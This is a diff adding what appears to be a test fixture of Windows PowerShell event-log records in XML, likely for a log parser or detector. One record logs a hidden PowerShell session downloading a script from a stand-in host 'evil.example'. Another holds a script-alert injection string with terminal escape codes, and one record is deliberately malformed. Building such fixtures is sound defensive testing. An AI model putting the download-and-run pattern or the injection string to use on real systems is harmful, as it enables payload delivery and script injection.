@@ -1,0 +1,37 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/><EventID>4103</EventID><Version>1</Version><Level>5</Level><Task>106</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime="2026-11-14T10:00:02.5000000Z"/><EventRecordID>201</EventRecordID><Correlation ActivityID="{00000000-0000-0000-0000-000000000000}"/><Execution ProcessID="4242" ThreadID="1"/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN11-LAB</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.22621.4111
+        Host ID = 8a6c1b8e-0000-0000-0000-000000000001
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden
+        Engine Version = 5.1.22621.4111
+        Runspace ID = 3d2b9c3a-0000-0000-0000-000000000002
+        Pipeline ID = 7
+        Command Name = Invoke-WebRequest
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 15
+        User = WIN11-LAB\\analyst
+        Connected User = 
+        Shell ID = Microsoft.PowerShell</Data><Data Name="UserData"></Data><Data Name="Payload">CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest"
+ParameterBinding(Invoke-WebRequest): name="Uri"; value="http://evil.example/a.ps1"</Data></EventData></Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4104</EventID><TimeCreated SystemTime="2026-11-14T10:00:05.0000000Z"/><EventData><Data Name="ScriptBlockText">oops no closing tags</EventData></Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/><EventID>4100</EventID><Version>1</Version><Level>5</Level><Task>106</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime="2026-11-14T10:00:04.0000000Z"/><EventRecordID>202</EventRecordID><Correlation ActivityID="{00000000-0000-0000-0000-000000000000}"/><Execution ProcessID="4242" ThreadID="1"/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN11-LAB</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.22621.4111
+        Host ID = 8a6c1b8e-0000-0000-0000-000000000001
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden
+        Engine Version = 5.1.22621.4111
+        Runspace ID = 3d2b9c3a-0000-0000-0000-000000000002
+        Pipeline ID = 7
+        Command Name = Invoke-WebRequest
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 15
+        User = WIN11-LAB\\analyst
+        Connected User = 
+        Shell ID = Microsoft.PowerShell</Data><Data Name="UserData"></Data><Data Name="Payload">Error Message = Cannot find path 'C:\nope' because it does not exist.
+
+FullyQualifiedErrorId = PathNotFound</Data></EventData></Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime="2026-11-14T10:00:06.0000000Z"/><EventRecordID>203</EventRecordID><Correlation ActivityID="{00000000-0000-0000-0000-000000000000}"/><Execution ProcessID="4300" ThreadID="1"/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN11-LAB</Computer><Security UserID="S-1-5-18"/></System><EventData><Data Name="MessageNumber">1</Data><Data Name="MessageTotal">1</Data><Data Name="ScriptBlockText">Write-Host "&lt;script&gt;alert(1)&lt;/script&gt;" &#x1B;[31mred&#x1B;[0m</Data><Data Name="ScriptBlockId">{99999999-0000-0000-0000-000000000000}</Data><Data Name="Path">C:\tools\x.ps1</Data></EventData></Event>
